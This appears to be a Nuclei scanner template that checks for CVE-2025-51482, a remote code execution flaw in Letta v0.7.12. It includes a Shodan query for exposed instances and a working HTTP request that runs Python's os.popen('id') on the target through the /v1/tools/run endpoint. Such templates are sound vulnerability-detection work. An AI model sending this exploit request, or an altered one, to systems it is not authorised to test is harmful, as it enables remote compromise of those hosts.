id: cve-2025-51482

info:
  name: Letta v0.7.12 - Remote Code Execution
  author: Muhe
  severity: critical
  description: |
    A critical remote code execution vulnerability exists in Letta v0.7.12 application's /v1/tools/run endpoint.
    The endpoint accepts arbitrary Python source code from users and executes it using Python's exec() function
    in an insufficiently sandboxed environment. This allows remote attackers to execute arbitrary code and
    system commands on the host system, potentially with root privileges.
  reference:
    - https://www.gecko.security/blog/cve-2025-51482
    - https://github.com/Kai-One001/Letta-CVE-2025-51482-RCE
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: cve-2025-51482
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 2
    shodan-query: 'http.title:"Letta"'
  tags: cve,cve2025,letta,rce,authenticated,critical

http:
  - raw:
      - |
        POST /v1/tools/run HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "source_code": "def exploit():\n    \"\"\"Execute id command.\"\"\"\n    import os\n    return os.popen('id').read()",
          "args": {},
          "env_vars": {"PYTHONPATH":"/usr/lib/python3/dist-packages"},
          "name": "exploit"
        }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"status":"success"'
          - '"tool_return"'
        condition: and

      - type: word
        part: body
        words:
          - "uid="
          - "root:"
        condition: or

      - type: status
        status:
          - 200
